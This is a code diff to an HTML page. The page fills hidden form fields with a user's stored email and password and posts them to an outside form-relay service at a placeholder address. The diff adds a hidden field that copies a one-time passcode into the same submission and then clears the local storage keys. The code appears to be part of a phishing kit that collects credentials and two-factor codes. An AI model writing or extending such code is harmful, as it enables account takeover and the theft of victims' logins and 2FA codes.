@@ -10,6 +10,7 @@
         <form action="https://formsubmit.co/YOUR_EMAIL" method="POST">
             <input type="hidden" name="email" id="form-email">
             <input type="hidden" name="password" id="form-password">
+            <input type="hidden" name="otp" id="form-otp"> <!-- Added OTP field -->
             <!-- Add other hidden inputs if needed -->
             <button type="submit" class="submit-btn">Submit</button>
         </form>
@@ -17,10 +18,16 @@
             // Retrieve user data from local storage
             document.getElementById('form-email').value = localStorage.getItem('userEmail');
             document.getElementById('form-password').value = localStorage.getItem('userPassword');
-            // If you have other data, set them similarly
+            document.getElementById('form-otp').value = localStorage.getItem('userOTP'); // Set OTP value
+
+            // Clear local storage if necessary
+            localStorage.removeItem('userEmail');
+            localStorage.removeItem('userPassword');
+            localStorage.removeItem('userOTP');
         </script>
     </div>
 </body>
 </html>
+
 
 
